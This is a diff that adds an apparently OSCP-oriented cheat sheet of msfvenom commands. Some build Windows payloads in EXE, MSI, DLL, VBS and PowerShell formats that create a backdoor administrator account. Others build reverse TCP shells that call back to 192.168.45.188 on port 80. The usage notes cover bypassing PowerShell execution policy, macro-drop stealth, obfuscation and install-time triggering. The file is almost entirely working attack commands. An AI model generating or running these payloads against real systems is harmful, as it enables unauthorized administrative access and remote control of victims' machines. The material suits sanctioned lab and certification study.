@@ -1,0 +1,64 @@
+
+#### 1. User Addition Payload (Add oscpuser with pass oscppass to Administrators)
+
+EXE:
+  x86 Command: msfvenom -p windows/exec CMD="net user oscpuser oscppass /add && net localgroup administrators oscpuser /add" -f exe -o adduser_x86.exe
+  x64 Command: msfvenom -p windows/x64/exec CMD="net user oscpuser oscppass /add && net localgroup administrators oscpuser /add" -f exe -o adduser_x64.exe
+  Output File Example: adduser_x86.exe
+  Notes: Executable; run directly.
+
+MSI:
+  x86 Command: msfvenom -p windows/exec CMD="net user oscpuser oscppass /add && net localgroup administrators oscpuser /add" -f msi -o adduser_x86.msi
+  x64 Command: msfvenom -p windows/x64/exec CMD="net user oscpuser oscppass /add && net localgroup administrators oscpuser /add" -f msi -o adduser_x64.msi
+  Output File Example: adduser_x86.msi
+  Notes: Installer; double-click or msiexec /i. Supports icons via --icon.
+
+DLL:
+  x86 Command: msfvenom -p windows/exec CMD="net user oscpuser oscppass /add && net localgroup administrators oscpuser /add" -f dll -o adduser_x86.dll
+  x64 Command: msfvenom -p windows/x64/exec CMD="net user oscpuser oscppass /add && net localgroup administrators oscpuser /add" -f dll -o adduser_x64.dll
+  Output File Example: adduser_x86.dll
+  Notes: Load with rundll32 adduser_x86.dll,entrypoint.
+
+VBS:
+  x86 Command: msfvenom -p windows/exec CMD="net user oscpuser oscppass /add && net localgroup administrators oscpuser /add" -f vbs -o adduser_x86.vbs
+  x64 Command: msfvenom -p windows/x64/exec CMD="net user oscpuser oscppass /add && net localgroup administrators oscpuser /add" -f vbs -o adduser_x64.vbs
+  Output File Example: adduser_x86.vbs
+  Notes: Script; run with cscript adduser_x86.vbs.
+
+PS1:
+  x86 Command: msfvenom -p windows/exec CMD="net user oscpuser oscppass /add && net localgroup administrators oscpuser /add" -f psh -o adduser_x86.ps1
+  x64 Command: msfvenom -p windows/x64/exec CMD="net user oscpuser oscppass /add && net localgroup administrators oscpuser /add" -f psh -o adduser_x64.ps1
+  Output File Example: adduser_x86.ps1
+  Notes: PowerShell; bypass execution policy with -ExecutionPolicy Bypass.
+
+#### 2. Reverse Shell Payload (TCP Rev Shell to 192.168.45.188:80)
+
+EXE:
+  x86 Command: msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.188 LPORT=80 -f exe -o revshell_x86.exe
+  x64 Command: msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.188 LPORT=80 -f exe -o revshell_x64.exe
+  Output File Example: revshell_x86.exe
+  Notes: Executable; run to connect back.
+
+MSI:
+  x86 Command: msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.188 LPORT=80 -f msi -o revshell_x86.msi
+  x64 Command: msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.188 LPORT=80 -f msi -o revshell_x64.msi
+  Output File Example: revshell_x86.msi
+  Notes: Installer; triggers on install.
+
+DLL:
+  x86 Command: msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.188 LPORT=80 -f dll -o revshell_x86.dll
+  x64 Command: msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.188 LPORT=80 -f dll -o revshell_x64.dll
+  Output File Example: revshell_x86.dll
+  Notes: Load with rundll32 revshell_x86.dll,entrypoint.
+
+VBS:
+  x86 Command: msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.188 LPORT=80 -f vbs -o revshell_x86.vbs
+  x64 Command: msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.188 LPORT=80 -f vbs -o revshell_x64.vbs
+  Output File Example: revshell_x86.vbs
+  Notes: Script; stealthy for macro drops.
+
+PS1:
+  x86 Command: msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.188 LPORT=80 -f psh -o revshell_x86.ps1
+  x64 Command: msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.188 LPORT=80 -f psh -o revshell_x64.ps1
+  Output File Example: revshell_x86.ps1
+  Notes: PowerShell; easy to obfuscate.
